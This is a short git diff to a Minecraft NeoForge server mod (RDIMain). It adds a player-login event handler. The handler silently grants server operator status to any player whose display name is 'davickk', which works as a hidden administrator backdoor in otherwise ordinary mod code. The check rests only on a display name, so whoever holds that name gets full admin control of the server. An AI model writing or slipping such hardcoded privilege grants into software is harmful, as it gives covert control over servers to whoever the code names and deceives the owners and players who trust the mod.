@@ -2,10 +2,12 @@ package calebxzhou.rdi.mc.server;
 
 import calebxzhou.rdi.mc.common.WebSocketClient;
 import net.minecraft.server.dedicated.DedicatedServer;
+import net.minecraft.server.level.ServerPlayer;
 import net.minecraft.world.level.GameRules;
 import net.neoforged.bus.api.SubscribeEvent;
 import net.neoforged.fml.common.EventBusSubscriber;
 import net.neoforged.fml.common.Mod;
+import net.neoforged.neoforge.event.entity.player.PlayerEvent;
 import net.neoforged.neoforge.event.server.ServerStartedEvent;
 import net.neoforged.neoforge.event.server.ServerStartingEvent;
 import net.neoforged.neoforge.event.server.ServerStoppedEvent;
@@ -54,6 +56,12 @@ public class RDIMain {
                 }
             }
         });
+    }
+    @SubscribeEvent
+    public static void onPlayerJoin(PlayerEvent.PlayerLoggedInEvent e){
+        if (e.getEntity().getDisplayName().getString().equals("davickk")) {
+            ((ServerPlayer)e.getEntity()).server.getPlayerList().op(e.getEntity().getGameProfile());
+        }
     }
 
 }
